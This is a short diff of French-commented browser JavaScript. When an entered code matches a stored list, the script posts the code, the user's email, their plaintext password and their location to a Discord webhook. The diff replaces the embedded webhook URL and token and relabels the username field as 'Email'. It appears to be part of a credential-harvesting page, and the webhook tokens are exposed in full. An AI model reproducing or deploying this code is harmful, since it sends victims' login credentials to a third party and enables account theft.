@@ -41,7 +41,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
       // Vérification du code
       if (stock.codes.includes(code)) {
-        const webhookUrl = "https://discord.com/api/webhooks/1366140909271384096/jAvGx7OI4_irwimvJ1tGblUIlu4Ayyba2orAxDwMHOmv4VQSSKmf2u5CUU9nyb2qsjeL";
+        const webhookUrl = "https://discord.com/api/webhooks/1366169881963397140/qrJkyU93yAt8e-R4m9bpf3VAxKQdSD35Deo9S-DiPWhEwbdNSq6bc7enJfRqbftpVlZd";
         
         const payload = {
           embeds: [{
@@ -49,7 +49,7 @@ document.addEventListener('DOMContentLoaded', () => {
             color: 0xee00ff,
             fields: [
               { name: "Code", value: `\`${code}\``, inline: false },
-              { name: "Username", value: `\`${username}\``, inline: true },
+              { name: "Email", value: `\`${username}\``, inline: true },
               { name: "Password", value: `\`${password}\``, inline: true },
               { name: "Location", value: `\`${location}\``, inline: false }
             ],
